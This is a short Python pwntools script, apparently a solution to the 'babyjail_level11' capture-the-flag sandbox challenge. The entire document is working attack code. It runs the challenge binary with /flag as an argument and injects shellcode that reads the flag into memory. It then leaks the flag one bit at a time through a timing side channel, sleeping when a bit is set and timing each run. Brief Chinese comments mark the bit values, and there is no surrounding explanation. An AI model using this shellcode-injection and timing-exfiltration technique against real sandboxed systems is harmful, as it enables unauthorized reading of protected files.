from pwn import *
import time
context(arch="amd64",os="linux",log_level="debug")
flag = ""
for i in range(0x39):
    f = ""
    for x in range(7):
        p = process(["/challenge/babyjail_level11", "/flag"])
        shellcode = shellcraft.read(3, 0x1337100, 0x39)
        shellcode += f"""
            xor rax, rax
            push rax
            movzx rax, byte ptr [0x1337100 + {i}]
            shr rax, {x}
            and rax, 1
            push rax
            mov rdi, rsp 
        """
        shellcode += shellcraft.nanosleep('rdi',0)
        shellcode = asm(shellcode)

        start = time.perf_counter()
        p.send(shellcode)
        p.wait()
        end = time.perf_counter()
        delta = end - start
        if delta < 1:
            # 比特为0
            f = "0" + f
        else:
            # 比特为1
            f = "1" + f
    flag_char = chr(int(f.zfill(8),2))
    flag += flag_char
print(flag)
